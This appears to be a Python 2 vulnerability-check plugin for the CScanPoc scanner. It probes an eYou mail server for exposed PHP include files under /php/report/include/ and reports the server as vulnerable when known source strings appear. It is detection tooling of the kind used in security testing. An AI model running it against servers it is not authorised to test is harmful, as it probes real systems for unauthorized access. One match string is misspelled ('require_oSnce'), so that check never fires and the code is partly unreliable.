# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '30ed9214-f707-49b7-95c9-0de7eae8d8da'
    name = '亿邮邮件系统 越权' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2014-07-24'  # 漏洞公布时间
    desc = '''
        亿邮邮件系统存在严重的越权，带来严重的安全危害。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=058462
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'eYou'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '64972cc8-668c-4cef-bce4-87b5e5762ae9'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payloads = ('/php/report/include/ldap.inc','php/report/include/util.inc','/php/report/include/weblib.inc ')
            for payload in payloads:
                url = '{target}'.format(target=self.target)+payload
                code, head, body, errcode, _url = hh.http(url)
                if code == 200 and 'require_once("config.inc");' in body:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
                elif code == 200 and 'require_oSnce("util.inc");' in body:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
                elif code == 200 and 'define(\'SMSAD_FILE\', "/var/webis/etc/smsad");' in body:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
                else:
                    pass           


        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()